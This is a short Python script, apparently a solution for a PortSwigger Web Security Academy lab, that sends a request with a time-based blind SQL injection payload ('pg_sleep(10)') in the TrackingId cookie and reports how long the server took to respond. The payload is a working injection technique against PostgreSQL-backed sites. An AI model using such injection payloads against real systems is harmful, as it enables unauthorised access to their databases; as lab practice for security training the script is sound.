import os
import requests
import string

def clearScreen():
    currentOS = os.name 

    if currentOS == "nt": os.system('cls')
    elif currentOS == "posix": os.system('clear')

if __name__ == "__main__":
    host = '' # Insert host here
    url = f'https://{host}.web-security-academy.net/'
    trackingID = '' # Insert tracking id here
    sessionID = '' # Insert session id here

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36',
        'Cookie': f"TrackingId={trackingID}'%3bselect+pg_sleep(10)--; session={sessionID}"
    }

    clearScreen()
    res = requests.get(url=url, headers=headers)
    print(f"[+] Response after {res.elapsed.seconds} seconds.")
    